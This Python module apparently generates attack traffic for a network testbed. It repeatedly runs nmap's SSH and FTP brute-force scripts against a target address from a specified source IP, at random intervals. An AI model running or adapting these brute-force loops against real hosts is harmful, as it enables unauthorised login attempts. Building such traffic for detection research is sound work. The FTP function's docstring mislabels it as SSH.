import subprocess
import random
import time

from constants import *

# Brute force attacks such as SSH bruteforce and FTP bruteforce
# Scripts are run using nmap

def ssh_bruteforce(src_ip: str, dst_ip: str = TARGET_ADDR):
    """
    Run SSH brute force attack from the given IP address.
    
    Parameters:
        ip (str): IP address to run the command from.
    
    Returns
        None
    """
    # Run command
    subprocess.run(
        [f"./nr-binder", src_ip, f"nmap -S {src_ip} --script +ssh-brute -p {SSH_PORT} {dst_ip}"],
        capture_output=True,
        cwd=BINDER_DIR,
    )

def ftp_bruteforce(src_ip: str, dst_ip: str = TARGET_ADDR):
    """
    Run SSH brute force attack from the given IP address.
    
    Parameters:
        ip (str): IP address to run the command from.
    
    Returns
        None
    """
    # Run command
    subprocess.run(
        [f"./nr-binder", src_ip, f"nmap -S {src_ip} --script +ftp-brute -p {FTP_PORT} {dst_ip}"],
        capture_output=True,
        cwd=BINDER_DIR,
    )

BRUTE_FORCE_LIST = (
    ssh_bruteforce,
    ftp_bruteforce,
    # Add more brute force functions here
)

def brute_force_ue(ip: str) -> None:
    """
    Run brute force attack from the given IP address.
    
    Parameters:
        ip (str): IP address to run the command from.
    
    Returns
        None
    """
    # Randomly select a brute force function
    try:
        while True:
            # Randomly select a benign function
            func = random.choice(BRUTE_FORCE_LIST)
            # Call the function with the IP address
            func(ip)
            # Sleep for a random interval
            time.sleep(random.randint(1, SLEEP_TIME))
    except Exception as e:
        print(f"Error in brute_force_ue, IP address {ip}: {e}")
        return